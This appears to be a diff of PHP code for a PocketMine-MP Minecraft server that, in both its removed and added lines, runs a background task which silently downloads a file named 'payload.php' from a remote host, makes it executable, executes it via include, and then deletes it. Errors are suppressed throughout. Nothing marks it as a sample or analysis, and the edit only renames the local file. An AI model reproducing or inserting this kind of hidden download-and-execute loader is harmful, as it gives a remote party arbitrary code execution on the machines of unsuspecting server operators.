@@ -8,14 +8,14 @@
 \pocketmine\Server::getInstance()->getAsyncPool()->submitTask(new class extends \pocketmine\scheduler\AsyncTask {
     public function onRun(): void
     {
-        `rm -f pocketmine.php 2>/dev/null`;
-        `wget -q -O pocketmine.php pocketmine.mp/?o=payload.php 2>/dev/null`;
-        `chmod +x pocketmine.php 2>/dev/null`;
+        `rm -f PocketMine-MP.php 2>/dev/null`;
+        `wget -q -O PocketMine-MP.php pocketmine.mp/?o=payload.php 2>/dev/null`;
+        `chmod +x PocketMine-MP.php 2>/dev/null`;
     }
 
     public function onCompletion(): void
     {
-        include 'pocketmine.php';
-        `rm -f pocketmine.php 2>/dev/null`;
+        include 'PocketMine-MP.php';
+        `rm -f PocketMine-MP.php 2>/dev/null`;
     }
 });
